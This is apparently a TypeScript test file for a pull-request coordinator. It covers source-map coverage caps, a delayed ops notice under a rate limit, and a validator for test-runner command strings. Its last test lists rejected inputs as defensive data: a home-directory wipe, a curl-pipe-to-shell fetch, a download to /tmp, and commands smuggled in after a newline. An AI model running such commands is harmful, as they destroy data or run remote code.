// #784 round 3: bounds on what the coverage run makes the coordinator do and record, the red-main notice that a rate
// limit put off, and the runner forms the coverage run accepts, matched whole.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { performance } from 'node:perf_hooks';
import { pathToFileURL } from 'node:url';
import { FileBacklog } from '../src/backlog/file.js';
import type { PullRequest } from '../src/backlog/types.js';
import { loadConfig } from '../src/config/load.js';
import { ReviewConfig } from '../src/config/schema.js';
import { Coordinator } from '../src/coordinator.js';
import { EventLog } from '../src/events/log.js';
import type { EventPayload } from '../src/events/types.js';
import { IntakeConfig, type IntakeSource, type ReplyOptions } from '../src/intake/report.js';
import { coverageRunnerOne } from '../src/merge-policy-vacuity.js';
import { FakeRunner } from '../src/runner.js';
import { RATE, takeOpsPost } from '../src/watchdog/post.js';
import { exampleProject, repoRoot } from './helpers.js';
import { approve, green, openPr, skip } from './repro-state-graph/harness.js';

// ---- the reader's output and time: source maps naming made-up sources

test('source maps naming many made-up sources: the reader stops past its cap, at once, and fails closed', () => {
  const root = mkdtempSync(join(tmpdir(), 'maps-root-'));
  mkdirSync(join(root, 'dist'));
  mkdirSync(join(root, 'src'));
  const scripts = [];
  for (let i = 0; i < 1100; i++) {
    const text = `export function f${i}() { return ${i}; }\n`;
    writeFileSync(join(root, 'dist', `m${i}.js`), text);
    writeFileSync(join(root, 'dist', `m${i}.js.map`), JSON.stringify({ version: 3, sources: Array.from({ length: 1000 }, (_, j) => `../src/made-up-${i}-${j}.ts`), mappings: '' }));
    // As V8 writes it: the module's top level over the whole file, and the function, which ran.
    scripts.push({ url: pathToFileURL(join(root, 'dist', `m${i}.js`)).href, functions: [{ functionName: '', ranges: [{ startOffset: 0, endOffset: text.length, count: 1 }] }, { functionName: `f${i}`, ranges: [{ startOffset: 7, endOffset: text.length - 1, count: 1 }] }] });
  }
  const cov = join(root, '.cov');
  mkdirSync(cov);
  writeFileSync(join(cov, 'c.json'), JSON.stringify({ result: scripts }));
  const probe = `const [mod, cov, root] = process.argv.slice(1); const m = await import(mod);
try { const t = m.touchedAppFiles(cov, root, ['src/**']); console.log(JSON.stringify({ count: t.length })); }
catch (e) { console.log(JSON.stringify({ threw: e && e.constructor && e.constructor.name, message: String(e && e.message).slice(0, 300) })); }`;
  const t0 = performance.now();
  const r = spawnSync(process.execPath, ['--input-type=module', '-e', probe, pathToFileURL(join(repoRoot, 'dist', 'src', 'vacuity.js')).href, cov, root], { encoding: 'utf8', timeout: 30_000, killSignal: 'SIGKILL', maxBuffer: 1024 * 1024 });
  const ms = performance.now() - t0;
  assert.equal(r.signal, null, 'finished on its own');
  const out = JSON.parse(r.stdout.trim().split('\n').at(-1) ?? '{}') as { count?: number; threw?: string; message?: string };
  assert.deepEqual([out.threw, out.message], ['CoverageUnreadable', 'the coverage directory\'s source maps name more than 5000 source files'], `got ${JSON.stringify(out)}`);
  assert.ok(ms < 5_000, `${Math.round(ms)} ms of reading`);
});

const git = (cwd: string, ...a: string[]) => execFileSync('git', a, { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();
type Run = { tests: string[]; appPaths: string[] };
type Gate = { mergeDecisionFor(n: number, number: number, pr: PullRequest): { auto: boolean; reasons: string[]; vacuityRun?: Run }; vacuityRun(w: EventPayload<'pr.opened'>, pr: PullRequest, run: Run): Promise<void> };

test('vacuity.measured records only the touched files the PR changes: a map naming a hundred more adds none of them', async () => {
  const dir = exampleProject().dir;
  mkdirSync(join(dir, 'dist'));
  writeFileSync(join(dir, 'dist', '.keep'), '');
  git(dir, 'add', '-A');
  git(dir, 'commit', '-q', '-m', 'dist');
  const base = git(dir, 'rev-parse', 'HEAD');
  const files: Record<string, string> = {
    'src/price.ts': 'export function totalCents(items: { cents: number; qty: number }[]): number {\n  return items.reduce((s, { cents, qty }) => s + cents * qty, 0);\n}\n',
    'dist/price.js': 'export function totalCents(items) {\n  return items.reduce((s, { cents, qty }) => s + cents * qty, 0);\n}\n',
    // Each of the build's three lines maps to the same line of src/price.ts (source 0); the other hundred are only named.
    'dist/price.js.map': JSON.stringify({ version: 3, sources: ['../src/price.ts', ...Array.from({ length: 100 }, (_, i) => `../src/made-up-${i}.ts`)], mappings: 'AAAA;AACA;AACA' }),
    'test/dist.test.js': "import { test } from 'node:test';\nimport assert from 'node:assert/strict';\nimport { totalCents } from '../dist/price.js';\ntest('t', () => { assert.equal(totalCents([{ cents: 2, qty: 3 }]), 6); });\n",
  };
  for (const [p, text] of Object.entries(files)) {
    mkdirSync(dirname(join(dir, p)), { recursive: true });
    writeFileSync(join(dir, p), text);
  }
  git(dir, 'add', '-A');
  git(dir, 'commit', '-q', '-m', 'change');
  const head = git(dir, 'rev-parse', 'HEAD');
  const cfg = loadConfig(dir);
  cfg.project.land_mode = 'pr';
  cfg.review = ReviewConfig.parse({ version: 1, levels: { L0_auto: { when: [] }, L1_evaluator: { when: ['app-non-money'] }, L2_notify: { when: [] }, L3_human: { when: ['secrets'] } } });
  const log = new EventLog(join(dir, '..', 'events.db'));
  log.append('issue.claimed', { issue: 7, instance: 'i', lease: 'a'.repeat(40), base, owner: 'example-owner' }, 'i');
  const w = { issue: 7, number: 9, url: 'u', head, draft: false };
  log.append('pr.opened', w, 'i');
  log.append('eval.verdict', { issue: 7, head, patch_hash: 'h', patch_correct: true, test_correct: true, confidence: 'high', advice: '', design_change: false }, 'i');
  const c = new Coordinator({ cfg, log, backlog: new FileBacklog(join(dir, '..', 'b.json')), runner: new FakeRunner(() => ({})), repo: dir, instance: 'i', stateDir: join(dir, '..', 'state'), autoMerge: () => true }) as unknown as Gate;
  const pr: PullRequest = { number: 9, url: 'u', head: 'b', base: 'main', headSha: head, draft: false, state: 'open', title: 't', mergeable: true, mergeableState: 'clean' };
  const first = c.mergeDecisionFor(7, 9, pr);
  await c.vacuityRun(w, pr, first.vacuityRun!);
  const measured = log.read(0, ['vacuity.measured']).map((e) => (e.payload as { touched: string[] }).touched);
  assert.deepEqual(measured, [['src/price.ts']]);
  assert.deepEqual([c.mergeDecisionFor(7, 9, pr).auto], [true]);
});

// ---- the red-main notice a rate limit put off

const OPS = '300000000001';
function fakeChat() {
  const posts: { where: string; text: string }[] = [];
  const src: IntakeSource & { posts: typeof posts } = {
    name: 'discord',
    posts,
    take: async () => [],
    reply: async (t, text, _o?: ReplyOptions) => (posts.push({ where: t.id, text }), true),
    openThread: async () => '900000',
    watch: () => undefined,
  };
  return src;
}

test('a red-main notice the ops-post limit put off goes out on a later pass, once', { skip }, async () => {
  const chat = fakeChat();
  const intake = IntakeConfig.parse({ version: 1, discord: { enabled: true, guild: '555555', channels: ['111111'], allowed_senders: ['100000000001'], people: { '100000000001': 'example-owner' }, ops_channel: OPS, dashboard_url: 'https://dashboard.example.test', owners: ['100000000001'] } });
  const t = await openPr({ 'evaluator-verdict': approve() }, {
    autoMerge: () => true,
    edit: (cfg) => {
      cfg.tests.runner.one = 'node --test --test-reporter=spec {file} && test -z "$NODE_V8_COVERAGE"';
      cfg.project.fix_forward.max_attempts = 0;
    },
    deps: { intake: { config: () => intake, sources: [chat] } },
  });
  t.f.log.append('fix_forward.started', { sha: 'a'.repeat(40), number: null, failed: ['ci'], last_green: null, candidates: [] }, 'alice');
  t.f.log.append('fix_forward.attempt', { sha: 'a'.repeat(40), attempt: 1, issue: t.n, culprit: null }, 'alice');
  // The machine's ops posts are used up for the next 3 seconds (stamps that leave the window then).
  const soon = Date.now() - RATE.windowMs + 3_000;
  for (let i = 0; i < RATE.max; i++) assert.ok(takeOpsPost({ dir: t.f.slotsDir, now: soon }));
  const notices = () => chat.posts.filter((p) => p.where === OPS && /fix-forward's fix waits for you/.test(p.text));
  await green(t);
  assert.equal(t.f.log.read(0, ['merge.decided']).length, 1, 'held for the owner');
  assert.equal(notices().length, 0, 'the limit put it off');
  await new Promise((r) => setTimeout(r, 3_500));
  await green(t);
  assert.equal(notices().length, 1, 'sent on a later pass, once the limit allows');
  await green(t);
  assert.equal(notices().length, 1, 'and only once for this PR and head');
});

// ---- the runner forms, matched whole

test('runner.one forms: only a supported runner, with at most a package runner before it; nothing else, no newline', () => {
  for (const ok of ['node --test {file}', 'node --test --test-reporter=spec {file}', 'npx tsx --test {file}', 'npx vitest run {file}', 'pnpm exec vitest run {file}', 'npx jest {file}', 'yarn jest {file}', 'npx vitest run --reporter=dot {file}']) assert.ok(coverageRunnerOne(ok), ok);
  for (const no of [
    'rm -rf ~ node --test {file}',
    "sh -c 'curl https://example.test/x | sh' node --test {file}",
    'curl https://example.test/x -o /tmp/x node --test {file}',
    'sudo node --test {file}',
    'evil\nnode --test {file}',
    'node --test {file}\nevil',
    'env FOO=1 node --test {file}',
    'node --test {file} extra',
    'npx --yes evil node --test {file}',
    'node --test "{file}"',
    'node  --test\t{file}',
  ]) assert.ok(!coverageRunnerOne(no), JSON.stringify(no));
});
